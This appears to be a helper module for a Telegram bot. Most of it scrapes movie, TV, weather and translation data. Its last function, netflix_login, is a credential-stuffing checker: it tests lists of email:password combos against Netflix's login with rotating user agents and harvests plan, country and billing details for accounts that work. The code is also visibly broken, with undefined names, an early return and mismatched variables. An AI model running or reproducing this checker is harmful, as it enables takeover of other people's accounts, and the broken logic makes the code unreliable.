from urllib.parse import quote

from bs4 import BeautifulSoup
from requests import Session, get, post
from telethon import Button

from ._config import TMDB_KEY as tapiKey
from ._helpers import human_currency


def search_imdb(query: str):
    """
    Search IMDB for the given query.

    Returns:
        str: The caption of the result.
        str: The URL of the poster.
    """

    url = "https://api.themoviedb.org/3/search/multi"
    params = {
        "api_key": tapiKey,
        "query": query,
        "language": "en-US",
        "page": "1",
        "include_adult": "false",
        "append_to_response": "credits",
    }
    response = get(
        url, params=params, headers={"User-Agent": "Mozilla/5.0"}, timeout=10
    ).json()
    if response["results"]:
        result = response["results"][0]
        if result["media_type"] == "movie":
            url = "https://api.themoviedb.org/3/movie/{}".format(result["id"])
            result = get(
                url,
                headers={"User-Agent": "Mozilla/5.0"},
                params={"api_key": tapiKey, "append_to_response": "credits"},
            ).json()
            poster_url = "https://image.tmdb.org/t/p/w500{}".format(
                result["poster_path"]
            )
            caption = "<b>{}</b>\n".format(result["title"])
            caption += (
                "<b>Year:</b> <code>{}</code>\n".format(result["release_date"][:4])
                if result.get("release_date")
                else ""
            )
            caption += (
                "<b>Runtime:</b> <code>{} min</code>\n".format(result["runtime"])
                if result.get("runtime")
                else ""
            )
            caption += (
                "<b>Genres:</b> {}\n".format(
                    ", ".join(g["name"] for g in result["genres"])
                )
                if result.get("genres")
                else ""
            )
            caption += (
                "<b>Rating:</b> <code>{}/10</code>\n".format(result["vote_average"])
                if result.get("vote_average")
                else ""
            )
            caption += (
                "<b>Tagline:</b> {}\n".format(result["tagline"])
                if result.get("tagline")
                else ""
            )
            caption += (
                "<b>Revenue:</b> {}\n".format(human_currency(result["revenue"]))
                if result.get("revenue")
                else ""
            )
            caption += (
                "<b>Production Companies:</b> {}\n".format(
                    ", ".join(c["name"] for c in result["production_companies"])
                )
                if result.get("production_companies")
                else ""
            )
            caption += (
                "<b>Cast:</b> {}\n".format(
                    ", ".join(c["name"] for c in result["credits"]["cast"][:5])
                )
                if result.get("credits")
                else ""
            )
            caption += (
                "\n<b>Overview:</b> <code>{}</code>\n".format(result["overview"])
                if result.get("overview")
                else ""
            )
            buttons = [
                [
                    Button.inline(
                        "🎬 Watch Trailer", data="imdb_trailer {}".format(result["id"])
                    ),
                ],
                [
                    Button.url(
                        "📖 More Info",
                        url="https://www.imdb.com/title/{}".format(result["imdb_id"]),
                    ),
                ],
            ]
        elif result["media_type"] == "tv":
            url = "https://api.themoviedb.org/3/tv/{}".format(result["id"])
            result = get(
                url,
                headers={"User-Agent": "Mozilla/5.0"},
                params={"api_key": tapiKey, "append_to_response": "credits"},
            ).json()
            poster_url = "https://image.tmdb.org/t/p/w500{}".format(
                result["poster_path"]
            )
            caption = "<b>{}</b>\n".format(result["name"])
            caption += (
                "<b>Year:</b> <code>{}</code>\n".format(
                    (
                        result["first_air_date"][:4]
                        if result.get("first_air_date")
                        else ""
                    )
                    + " - "
                    + (
                        result["last_air_date"][:4]
                        if result.get("last_air_date")
                        else ""
                    )
                )
                if result.get("first_air_date")
                else ""
            )
            caption += (
                "<b>Runtime:</b> <code>{} min</code>\n".format(
                    result["episode_run_time"][0]
                )
                if result.get("episode_run_time")
                else ""
            )
            caption += (
                "<b>Genres:</b> {}\n".format(
                    ", ".join(g["name"] for g in result["genres"])
                )
                if result.get("genres")
                else ""
            )
            caption += (
                "<b>Rating:</b> <code>{}/10</code>\n".format(result["vote_average"])
                if result.get("vote_average")
                else ""
            )
            caption += (
                "<b>Tagline:</b> {}\n".format(result["tagline"])
                if result.get("tagline")
                else ""
            )
            caption += (
                "<b>Production Companies:</b> {}\n".format(
                    ", ".join(c["name"] for c in result["production_companies"])
                )
                if result.get("production_companies")
                else ""
            )
            caption += (
                "<b>Cast:</b> {}\n".format(
                    ", ".join(c["name"] for c in result["credits"]["cast"][:5])
                )
                if result.get("credits")
                else ""
            )
            caption += (
                "<b>Networks:</b> {}\n".format(
                    ", ".join(c["name"] for c in result["networks"])
                )
                if result.get("networks")
                else ""
            )
            caption += (
                "<b>Next Episode:</b> {}\n".format(
                    (
                        result["next_episode_to_air"]["name"]
                        if result.get("next_episode_to_air")
                        else ""
                    )
                    + " -<code>"
                    + (
                        result["next_episode_to_air"]["air_date"]
                        if result.get("next_episode_to_air")
                        else "N/A"
                    )
                )
                + "</code>"
                if result.get("next_episode_to_air")
                else ""
            )
            caption += (
                "\n<b>Status:</b> <code>{}</code>\n".format(result["status"])
                if result.get("status")
                else ""
            )
            caption += (
                "\n<b>Overview:</b> <code>{}</code>\n".format(result["overview"])
                if result.get("overview")
                else ""
            )
            buttons = [
                Button.inline(
                    "🔍 Search on TMDb", "tmdb_search {}".format(result["name"])
                )
            ]
    else:
        caption, poster_url, buttons = "No results found.", None, None
    return caption, poster_url, buttons


def get_imdb_title_with_keyword(keyword: str):
    """Get IMDB title with keyword"""
    url = "https://www.imdb.com/find?ref_=nv_sr_fn&q={}&s=tt".format(keyword)
    response = get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    result = soup.find("td", {"class": "result_text"})
    if result:
        return result.a.attrs["href"].split("/")[2]
    return "No results found"


def get_imdb_soup(keyword: str):
    """Get IMDB soup"""
    imdb_id = get_imdb_title_with_keyword(keyword)
    url = "https://www.imdb.com/title/{}/".format(imdb_id)
    response = get(url)
    return BeautifulSoup(response.text, "html.parser")


def get_weather(city: str):
    """Get weather from openweathermap.org"""
    url = "https://www.timeanddate.com/scripts/completion.php"
    params = {"xd": 21, "query": city, "mode": "ci"}
    response = get(url, params=params)
    if response.text == "":
        return "City not found"
    print(response.text)
    url = "https://www.timeanddate.com" + response.text.split("/ext")[0]
    response = get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    weather = soup.find("div", {"id": "qlook"})
    data = weather.find_all("p")
    stat = data[0].text
    info = str(data[1]).split("<br/>")
    details = [x.text for x in soup.find(class_="bk-focus__info").find_all("td")]
    result = (
        "<b>Weather in <code>{}</code></b>\n\n".format(city)
        + "<b>Temperature:</b> <code>{}</code>\n".format(
            weather.find("div", {"class": "h2"}).text
        )
        + "<b>Status:</b> {}\n".format(stat)
        + "<b>Feels like:</b> <code>{}</code>\n".format(info[0].split(": ")[1])
        + "<b>Forecast:</b> <code>{}</code>\n".format(
            info[1].split(": ")[1].split("<")[0]
        )
        + "<b>Wind:</b> <code>{}</code>\n".format(info[2].split(": ")[1].split("<")[0])
        + "<b>Location:</b> {}\n".format(details[0])
        + "<b>Current Time:</b> <code>{}</code>\n".format(details[1])
        + "<b>Latest Update:</b> <code>{}</code>\n".format(details[2])
        + "<b>Visibility:</b> {}\n".format(details[3])
        + "<b>Pressure:</b> <code>{}</code>\n".format(details[4])
        + "<b>Humidity:</b> <code>{}</code>\n".format(details[5])
        + "<b>Dew Point:</b> <code>{}</code>\n".format(details[6])
        + "\n<b>🎉 @MissValeri_Bot</b>"
    )
    return result


def translate(text, to_lang="en"):
    url = "https://www.google.com/async/translate?vet=12ahUKEwiM3pvpx8z1AhV_SmwGHRb5C5MQqDh6BAgDECY..i&ei=EL_vYYyWFP-UseMPlvKvmAk&client=opera&yv=3"
    data = f"async=translate,sl:auto,tl:{to_lang},st:{quote(text)},id:1643102010421,qc:true,ac:true,_id:tw-async-translate,_pms:s,_fmt:pc"
    headers = {
        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19",
    }
    request = post(url, data=data, headers=headers)
    soup = BeautifulSoup(request.text, "html.parser")
    result = soup.find("span", {"id": "tw-answ-target-text"})
    return result.text if result else "vision.google.api returned err."


from fake_useragent import UserAgent as ua


def netflix_login(combos):
    hits = 0
    bad = 0
    result = []
    for combo in combos:
        client = Session()
        login = client.get(
            "https://www.netflix.com/login", headers={"User-Agent": ua().random}
        )
        soup = BeautifulSoup(login.text, "html.parser")
        loginForm = soup.find("form")
        authURL = loginForm.find("input", {"name": "authURL"}).get("value")
        headers = {
            "user-agent": ua().random,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": "https://www.netflix.com/login",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": "",
        }
        data = {
            "userLoginId:": combo.split(":")[0],
            "password": combo.split(":")[1],
            "rememberMeCheckbox": "true",
            "flow": "websiteSignUp",
            "mode": "login",
            "action": "loginAction",
            "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
            "authURL": authURL,
            "nextPage": "https://www.netflix.com/browse",
            "countryCode": "+1",
            "countryIsoCode": "US",
        }

        request = client.post(
            "https://www.netflix.com/login",
            headers=headers,
            data=data,
        )
        cookie = dict(
            flwssn=client.get(
                "https://www.netflix.com/login", headers={"User-Agent": ua().random}
            ).cookies.get("flwssn")
        )

        if (
            "Sorry, we can't find an account with this email address. Please try again or"
            in request.text
        ):
            bad += 1
            print("No email.")
        elif "Incorrect password" in request.text:
            bad += 1
            print("Incorrect pass.")
        
        else:
            print(requests.text)
            return 
            info = client.get(
                "https://www.netflix.com/YourAccount",
                headers={
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive",
                    "Host": "www.netflix.com",
                    "Referer": "https://www.netflix.com/browse",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-User": "?1",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
                },
                cookies=cookie,
                timeout=10,
            ).text

            plan = (
                info.split('data-uia="plan-label"><b>')[1].split("</b>")[0]
                if len(info.split('data-uia="plan-label"><b>')) > 1
                else "null"
            )
            country = info.split('","currentCountry":"')[1].split('"')[0]
            expiry = info.split('data-uia="nextBillingDate-item">')[1].split("<")[0]
            hits += 1
            results.append(
                {
                    "email": combo.split(":")[0],
                    "password": combo.split(":")[1],
                    "plan": plan,
                    "country": country,
                    "expiry": expiry,
                }
            )
    return result, hits, bad
